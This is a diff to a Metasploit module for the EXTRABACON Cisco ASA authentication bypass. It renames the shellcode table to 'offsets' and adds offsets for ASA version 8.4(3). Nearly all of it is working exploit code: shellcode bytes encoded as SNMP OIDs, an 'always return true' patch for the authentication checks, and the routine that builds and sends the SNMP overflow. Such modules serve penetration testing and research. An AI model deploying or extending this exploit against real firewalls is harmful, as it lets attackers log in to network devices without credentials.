@@ -14,7 +14,7 @@ class MetasploitModule < Msf::Auxiliary
       'Name'        => 'Cisco ASA Authentication Bypass (EXTRABACON)',
       'Description' => %q{
           This module patches the authentication functions of a Cisco ASA
-          to allow uncredentialed logins. Uses improved shellcode for payload.
+          to allow uncredentialed logins. Uses improved offsets for payload.
         },
       'Author'      =>
         [
@@ -37,18 +37,21 @@ class MetasploitModule < Msf::Auxiliary
     ], self.class)
     deregister_options("VERSION")
 
-    @shellcode = {
+    @offsets = {
 
-      "9.2(3)" => ["29.112.29.8",   # jmp_esp_offset, 0
-                   "134.115.39.9",  # saferet_offset, 1
-                   "72",            # fix_ebp,        2
-                   "0.128.183.9",   # pmcheck_bounds, 3
-                   "16.128.183.9",  # pmcheck_offset, 4
-                   "85.49.192.137", # pmcheck_code,   5
-                   "0.80.8.8",      # admauth_bounds, 6
-                   "64.90.8.8",     # admauth_offset, 7
-                   "85.137.229.87"] # admauth_code,   8
+      "9.2(3)" => ["29.112.29.8",      # jmp_esp_offset, 0
+                   "134.115.39.9",     # saferet_offset, 1
+                   "72",               # fix_ebp,        2
+                   "0.128.183.9",      # pmcheck_bounds, 3
+                   "16.128.183.9",     # pmcheck_offset, 4
+                   "85.49.192.137",    # pmcheck_code,   5
+                   "0.80.8.8",         # admauth_bounds, 6
+                   "64.90.8.8",        # admauth_offset, 7
+                   "85.137.229.87"],   # admauth_code,   8
+      
+      "8.4(3)" => ["13.178.7.8", "150.219.224.8", "72", "0.192.84.9", "208.207.84.9", "85.49.192.137", "0.16.8.8", "208.23.8.8", "85.137.229.87"]
     }
+
   end
 
   def setup
@@ -77,7 +80,7 @@ class MetasploitModule < Msf::Auxiliary
 
     asa_vers = fw_version_check(vers_string)
 
-    if @shellcode[asa_vers]
+    if @offsets[asa_vers]
       print_status("Payload for Cisco ASA version #{asa_vers} available")
       return Exploit::CheckCode::Appears
     end
@@ -86,33 +89,33 @@ class MetasploitModule < Msf::Auxiliary
     return Exploit::CheckCode::Detected
   end
 
-  def build_shellcode(asa_vers, mode)
+  def build_offsets(asa_vers, mode)
       if mode == 'pass-disable'
           always_return_true = "49.192.64.195"
           pmcheck_bytes = always_return_true
           admauth_bytes = always_return_true
       else
-          pmcheck_bytes = @shellcode[asa_vers][5]
-          admauth_bytes = @shellcode[asa_vers][8]
+          pmcheck_bytes = @offsets[asa_vers][5]
+          admauth_bytes = @offsets[asa_vers][8]
       end
 
       preamble_snmp = ""
       preamble_snmp += "49.219.49.246.49.201.49.192.96.49.210.128.197.16.128.194.7.4.125.80.187."
-      preamble_snmp += @shellcode[asa_vers][3]
+      preamble_snmp += @offsets[asa_vers][3]
       preamble_snmp += ".205.128.88.187."
-      preamble_snmp += @shellcode[asa_vers][6]
+      preamble_snmp += @offsets[asa_vers][6]
       preamble_snmp += ".205.128.199.5."
-      preamble_snmp += @shellcode[asa_vers][4]
+      preamble_snmp += @offsets[asa_vers][4]
       preamble_snmp += "."
       preamble_snmp += pmcheck_bytes
       preamble_snmp += ".199.5."
-      preamble_snmp += @shellcode[asa_vers][7]
+      preamble_snmp += @offsets[asa_vers][7]
       preamble_snmp += "."
       preamble_snmp += admauth_bytes
       preamble_snmp += ".97.104."
-      preamble_snmp += @shellcode[asa_vers][1]
+      preamble_snmp += @offsets[asa_vers][1]
       preamble_snmp += ".128.195.16.191.11.15.15.15.137.229.131.197."
-      preamble_snmp += @shellcode[asa_vers][2]
+      preamble_snmp += @offsets[asa_vers][2]
       preamble_snmp += ".195"
 
       wrapper = preamble_snmp
@@ -126,7 +129,7 @@ class MetasploitModule < Msf::Auxiliary
       head += "9.95"
       finder_snmp = "139.124.36.20.139.7.255.224.144"
 
-      overflow = [head, wrapper, @shellcode[asa_vers][0], finder_snmp].join(".")
+      overflow = [head, wrapper, @offsets[asa_vers][0], finder_snmp].join(".")
       return overflow
   end
 
@@ -145,7 +148,7 @@ class MetasploitModule < Msf::Auxiliary
 
       print_status("Building payload for #{mode}...")
 
-      overflow = build_shellcode(asa_vers, mode)
+      overflow = build_offsets(asa_vers, mode)
       payload = SNMP::ObjectId.new(overflow)
 
       print_status("Sending SNMP payload...")
